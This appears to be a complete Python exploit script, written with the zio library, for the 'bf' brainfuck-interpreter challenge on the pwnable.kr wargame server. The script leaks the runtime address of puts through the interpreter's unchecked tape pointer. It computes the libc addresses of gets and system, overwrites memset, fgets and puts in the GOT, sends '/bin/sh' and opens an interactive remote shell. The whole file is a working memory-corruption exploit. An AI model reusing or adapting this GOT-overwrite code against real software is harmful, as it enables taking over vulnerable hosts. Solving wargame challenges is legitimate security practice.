from zio import *
import struct
target = ("pwnable.kr", 9001)
#in my pc
#target = "./bf"
io = zio(target, timeout = 9999)
io.read_until("except [ ]\n")


tape_addr = 0x0804a0a0
now_pos = tape_addr



def goto_addr(addr):
	global now_pos
	buff = ""
	if addr > now_pos:
		buff += (addr - now_pos) * ">"
	elif addr < now_pos:
		buff += (now_pos - addr) * "<"

	now_pos = addr

	return buff

def read_data(size):
	global now_pos
	buff = ""
	for i in xrange(size):
		buff += ".>"
		now_pos += 1
	return buff

def write_data(size):
	global now_pos
	buff = ""
	for i in xrange(size):
		buff += ",>"
		now_pos += 1
	return buff

def call_puts():
	global now_pos
	return "["

raw_input(":")


#step 
#modify memset to gets
#modify fget to system
#send buff /bin/sh


puts_addr = 0x0804a018
memset_addr = 0x0804a02c
fgets_addr = 0x0804a010

#code = "/bin/sh "
code = ""

#read puts addr
code += goto_addr(puts_addr)
code += read_data(4)

#modify puts
code += goto_addr(puts_addr)
code += write_data(4)

#modify memset
code += goto_addr(memset_addr)
code += write_data(4)

#modify fgets
code += goto_addr(fgets_addr)
code += write_data(4)

#call puts
code += call_puts()
io.write(code + "\n")

#read puts real addr
data = io.read(4)
puts_addr_real = struct.unpack("I", data)[0]
print "puts:", hex(puts_addr_real)
print "---------------------------"

system_addr_t = 0x0003F250
puts_addr_t = 0x000677E0
gets_addr_t = 0x00066E50

"""
#in my pc
system_addr_t = 0x0003E770
puts_addr_t = 0x00065F30
gets_addr_t = 0x000656A0
"""

#modify puts to ret
ret_addr_t = 0x08048710
ret_addr_data = struct.pack("I", ret_addr_t)
io.write(ret_addr_data)

#modify memset to gets
gets_addr_real = puts_addr_real - (puts_addr_t - gets_addr_t)
gets_addr_data = struct.pack("I", gets_addr_real)
print "gets:", hex(gets_addr_real)
io.write(gets_addr_data)

#modify fgets to system
system_addr_real = puts_addr_real - (puts_addr_t - system_addr_t)
system_addr_data = struct.pack("I", system_addr_real)
print "system:", hex(system_addr_real)
io.write(system_addr_data)

#gets read /bin/sh
io.write("/bin/sh\x00\n")

io.interact()